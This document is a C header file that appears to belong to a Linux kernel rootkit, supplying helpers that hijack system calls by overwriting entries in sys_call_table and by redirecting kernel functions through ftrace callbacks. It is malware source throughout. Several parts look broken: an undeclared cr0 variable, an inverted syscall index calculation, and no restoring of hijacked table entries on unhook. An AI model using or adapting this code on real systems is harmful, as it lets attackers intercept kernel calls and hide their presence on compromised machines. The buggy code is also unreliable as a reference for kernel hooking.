#ifndef HOOK_HELPER_H
#define HOOK_HELPER_H

/*
#define HOOK_DEF(ret, convention, name, ...) \
    typedef ret (convention *name##_t)(__VA_ARGS__); \
    name##_t orig_##name; \
    ret convention name(__VA_ARGS__)

*/

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define FTRACE 0
#define SYSCALL_TABLE_HIJACKING 1

#define UNKOWN_HOOK_FUNCTION 0x175AFACE

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_hook_type, _hook_target) \
    { \
        .name = SYSCALL_NAME("sys_" #_hook_target), \
        .hook_func = hook_##_hook_target, \
        .orig_func = &orig_##_hook_target, \
        .hook_type = _hook_type, \
        .syscall_table_hijacking.index =  __NR_##_hook_target \
    }
    /* 
    static void __attribute__((constructor)) _hook_init_##_hook_target(void) { \
        hook(& _hook_##_hook_target); \
    }
    */

#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

#ifndef ROOTKIT_NAME
#define ROOTKIT_NAME "rootkit" 
#endif

;

struct hook
{
    char *name;
    void *hook_func;
    void *orig_func;
    unsigned long address;

    union {
        struct {
            struct ftrace_ops ops;
        } ftrace;
        struct {
            unsigned long index;
        } syscall_table_hijacking;
        
    };
    
    char hook_type;
};

static long syscall_table = 0;

unsigned long get_symbol_by_name(char *name)
{
    unsigned long symbol = kallsyms_lookup_name(name);
    if(!symbol)
    {
        printk(KERN_DEBUG "[%s|HOOKING]: Couldn't find the symbol %s\n", ROOTKIT_NAME, name);
        return 0;
    }
    return symbol;
}

unsigned long get_syscall_table(void)
{
    if(!syscall_table)
    {
        syscall_table = get_symbol_by_name("sys_call_table");
        if(!syscall_table)
            return 0;
    }
    return syscall_table;
}

unsigned long get_syscall_index(char *name)
{
    return (get_syscall_table() - get_symbol_by_name(name)) / sizeof(void *);
}


int hook_syscall_table_hijacking(struct hook *hook) {
    *((unsigned long*) hook->orig_func) = ((unsigned long*)get_syscall_table())[get_syscall_index(hook->name)];
#if PTREGS_SYSCALL_STUBS
    write_cr0_forced(cr0);
#else
    write_cr0(cr0);
#endif
    ((unsigned long*)get_syscall_table())[get_syscall_index(hook->name)] = (unsigned long)hook->hook_func;\
    return 0;
}

static void ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct hook *hook = container_of(ops, struct hook, ftrace.ops);
#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->hook_func;
#else
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->hook_func;
#endif
}

int hook_ftrace(struct hook *hook) {
    int err;
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address) {
        printk(KERN_DEBUG "[%s|HOOKING]: Couldn't find %s to hook\n", ROOTKIT_NAME, hook->name);
        return false;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->orig_func) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->orig_func) = hook->address;
#endif

    hook->ftrace.ops.func = ftrace_thunk;
    hook->ftrace.ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION_SAFE
            | FTRACE_OPS_FL_IPMODIFY;
    
    err = ftrace_set_filter_ip(&hook->ftrace.ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "[%s|HOOKING]: ftrace_set_filter_ip() failed: %d\n", ROOTKIT_NAME, err);
        return err;
    }

    err = register_ftrace_function(&hook->ftrace.ops);
    if (err) {
        printk(KERN_DEBUG "[%s|HOOKING]: register_ftrace_function() failed: %d\n", ROOTKIT_NAME, err);
        return err;
    }

    return 0;
}

int hook_to(struct hook *hook) {
    printk(KERN_DEBUG "[%s|HOOKING]: Hooking %s\n", ROOTKIT_NAME, hook->name);
    switch (hook->hook_type) {
        case FTRACE:
            return hook_ftrace(hook);
        case SYSCALL_TABLE_HIJACKING:
            return hook_syscall_table_hijacking(hook);
        default:
            printk(KERN_DEBUG "[%s|HOOKING]: Unknown hook type\n", ROOTKIT_NAME);
            return UNKOWN_HOOK_FUNCTION;
    }
}

void unhook_ftrace(struct hook *hook) {
    int err = unregister_ftrace_function(&hook->ftrace.ops);
    if(err)
    {
        printk(KERN_DEBUG "[%s|HOOKING]: unregister_ftrace_function() failed: %d\n", ROOTKIT_NAME, err);
    }

    err = ftrace_set_filter_ip(&hook->ftrace.ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "[%s|HOOKING]: ftrace_set_filter_ip() failed: %d\n", ROOTKIT_NAME, err);
    }
}

void unhook_from(struct hook *hook) {
    switch (hook->hook_type) {
        case FTRACE:
            unhook_ftrace(hook);
            break;
        default:
            printk(KERN_DEBUG "[%s|HOOKING]: Unknown hook type\n", ROOTKIT_NAME);
            break;
    }
}

int hook_to_all(struct hook *hooks, size_t num_hooks) {
    int err;
    size_t i;
    for (i = 0; i < num_hooks; i++) {
        err = hook_to(&hooks[i]);
        if (err) {
            printk(KERN_DEBUG "[%s|HOOKING]: Failed to hook %s, got %d\n", ROOTKIT_NAME, hooks[i].name, err);
            unhook_from(&hooks[i]);
        }
    }
    return 0;
}

void unhook_from_all(struct hook *hooks, size_t num_hooks) {
    size_t i;
    for (i = 0; i < num_hooks; i++) {
        unhook_from(&hooks[i]);
    }
}

#endif // HOOK_HELPER_H